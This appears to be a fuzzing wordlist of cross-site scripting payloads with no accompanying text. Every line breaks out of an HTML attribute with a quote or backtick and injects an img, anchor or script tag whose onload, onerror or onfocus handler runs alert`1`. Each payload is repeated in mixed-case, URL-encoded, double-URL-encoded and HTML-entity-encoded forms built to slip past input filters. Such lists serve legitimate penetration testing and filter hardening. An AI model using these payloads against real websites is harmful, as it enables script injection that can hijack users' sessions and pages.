+1%2527%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onload%253Dalert%25601%2560%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;img src=doesNotExist.NaN onload=alert`1`&gt;&lt;a href=&#x27;1
+1'><iMG src=DoesNoTExisT.NaN ONeRrOR=AlerT`1`><A hrEF='1
+1%27%3E%3Cimg%20src%3DdoesNotExist.NaN%20onerror%3Dalert%601%60%3E%3Ca%20href%3D%271
+1%2527%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onerror%253Dalert%25601%2560%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;img src=doesNotExist.NaN onerror=alert`1`&gt;&lt;a href=&#x27;1
+1'><imG SrC=DOesNOTExIST.NAN aUtOfoCUs ONFoCus=aLerT`1`><a hrEf='1
+1%27%3E%3Cimg%20src%3DdoesNotExist.NaN%20autofocus%20onfocus%3Dalert%601%60%3E%3Ca%20href%3D%271
+1%2527%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520autofocus%2520onfocus%253Dalert%25601%2560%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;img src=doesNotExist.NaN autofocus onfocus=alert`1`&gt;&lt;a href=&#x27;1
+1'><img SRC=/iMaGe/favicoN.ICo oNLOAD=AlerT`1`><A HReF='1
+1%27%3E%3Cimg%20src%3D/image/favicon.ico%20onload%3Dalert%601%60%3E%3Ca%20href%3D%271
+1%2527%253E%253Cimg%2520src%253D/image/favicon.ico%2520onload%253Dalert%25601%2560%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;img src=/image/favicon.ico onload=alert`1`&gt;&lt;a href=&#x27;1
+1'><IMg srC=/ImagE/faviCoN.iCo OneRROr=aleRT`1`><A hrEf='1
+1%27%3E%3Cimg%20src%3D/image/favicon.ico%20onerror%3Dalert%601%60%3E%3Ca%20href%3D%271
+1%2527%253E%253Cimg%2520src%253D/image/favicon.ico%2520onerror%253Dalert%25601%2560%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;img src=/image/favicon.ico onerror=alert`1`&gt;&lt;a href=&#x27;1
+1'><ImG SRc=/ImaGE/FAvIcoN.ICo autOfoCuS onFOCuS=alERT`1`><a hrEF='1
+1%27%3E%3Cimg%20src%3D/image/favicon.ico%20autofocus%20onfocus%3Dalert%601%60%3E%3Ca%20href%3D%271
+1%2527%253E%253Cimg%2520src%253D/image/favicon.ico%2520autofocus%2520onfocus%253Dalert%25601%2560%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;img src=/image/favicon.ico autofocus onfocus=alert`1`&gt;&lt;a href=&#x27;1
+1'><A hrEf="hTtP://DOeSNotExiSt.NaN" onLOad=AleRT`1`><A hREf='1
+1%27%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onload%3Dalert%601%60%3E%3Ca%20href%3D%271
+1%2527%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onload%253Dalert%25601%2560%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onload=alert`1`&gt;&lt;a href=&#x27;1
+1'><A Href="HtTp://DoeSNOtExIsT.NAN" oNERROr=ALERt`1`><A hREf='1
+1%27%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onerror%3Dalert%601%60%3E%3Ca%20href%3D%271
+1%2527%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onerror%253Dalert%25601%2560%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onerror=alert`1`&gt;&lt;a href=&#x27;1
+1'><A HREF="htTP://dOesNotExIst.NAN" autOfocuS ONFOCuS=aLeRT`1`><A HreF='1
+1%27%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20autofocus%20onfocus%3Dalert%601%60%3E%3Ca%20href%3D%271
+1%2527%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520autofocus%2520onfocus%253Dalert%25601%2560%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; autofocus onfocus=alert`1`&gt;&lt;a href=&#x27;1
+1`><scriPt>AlERt`1`<ScrIpT><a hreF=`1
+1%60%3E%3Cscript%3Ealert%601%60%3Cscript%3E%3Ca%20href%3D%601
+1%2560%253E%253Cscript%253Ealert%25601%2560%253Cscript%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;script&gt;alert`1`&lt;script&gt;&lt;a href=`1
+1`><imG sRc=DoESNoTExiST.NaN onLoAD=alERT`1`><a hrEf=`1
+1%60%3E%3Cimg%20src%3DdoesNotExist.NaN%20onload%3Dalert%601%60%3E%3Ca%20href%3D%601
+1%2560%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onload%253Dalert%25601%2560%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;img src=doesNotExist.NaN onload=alert`1`&gt;&lt;a href=`1
+1`><ImG sRc=dOeSNoTExisT.NAN OnERrOr=ALErT`1`><a hrEF=`1
+1%60%3E%3Cimg%20src%3DdoesNotExist.NaN%20onerror%3Dalert%601%60%3E%3Ca%20href%3D%601
+1%2560%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onerror%253Dalert%25601%2560%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;img src=doesNotExist.NaN onerror=alert`1`&gt;&lt;a href=`1
+1`><Img SRC=DoesNOTEXiST.NAN AutOfOcus OnFOcus=ALERt`1`><A hrEF=`1
+1%60%3E%3Cimg%20src%3DdoesNotExist.NaN%20autofocus%20onfocus%3Dalert%601%60%3E%3Ca%20href%3D%601
+1%2560%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520autofocus%2520onfocus%253Dalert%25601%2560%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;img src=doesNotExist.NaN autofocus onfocus=alert`1`&gt;&lt;a href=`1
+1`><iMg SRc=/IMAGE/faviCoN.ICO ONlOAd=AleRt`1`><A HREF=`1
+1%60%3E%3Cimg%20src%3D/image/favicon.ico%20onload%3Dalert%601%60%3E%3Ca%20href%3D%601
+1%2560%253E%253Cimg%2520src%253D/image/favicon.ico%2520onload%253Dalert%25601%2560%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;img src=/image/favicon.ico onload=alert`1`&gt;&lt;a href=`1
+1`><imG SRC=/Image/FAVICon.Ico OnERROr=AlErT`1`><a Href=`1
+1%60%3E%3Cimg%20src%3D/image/favicon.ico%20onerror%3Dalert%601%60%3E%3Ca%20href%3D%601
+1%2560%253E%253Cimg%2520src%253D/image/favicon.ico%2520onerror%253Dalert%25601%2560%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;img src=/image/favicon.ico onerror=alert`1`&gt;&lt;a href=`1
+1`><ImG sRc=/Image/faVIcon.IcO autOFOCuS ONfoCus=aleRT`1`><A HrEF=`1
+1%60%3E%3Cimg%20src%3D/image/favicon.ico%20autofocus%20onfocus%3Dalert%601%60%3E%3Ca%20href%3D%601
+1%2560%253E%253Cimg%2520src%253D/image/favicon.ico%2520autofocus%2520onfocus%253Dalert%25601%2560%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;img src=/image/favicon.ico autofocus onfocus=alert`1`&gt;&lt;a href=`1
+1`><A href="htTp://DoESNOTEXiSt.NAN" ONlOaD=ALerT`1`><A HReF=`1
+1%60%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onload%3Dalert%601%60%3E%3Ca%20href%3D%601
+1%2560%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onload%253Dalert%25601%2560%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onload=alert`1`&gt;&lt;a href=`1
+1`><a HRef="HTTp://doEsNOTExiST.NAN" oNERROr=aleRt`1`><a hrEf=`1
+1%60%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onerror%3Dalert%601%60%3E%3Ca%20href%3D%601
+1%2560%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onerror%253Dalert%25601%2560%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onerror=alert`1`&gt;&lt;a href=`1
+1`><A HREF="http://doesNoTEXIST.NAN" AUTofocUS OnfOCUs=aleRt`1`><A HREF=`1
+1%60%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20autofocus%20onfocus%3Dalert%601%60%3E%3Ca%20href%3D%601
+1%2560%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520autofocus%2520onfocus%253Dalert%25601%2560%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; autofocus onfocus=alert`1`&gt;&lt;a href=`1
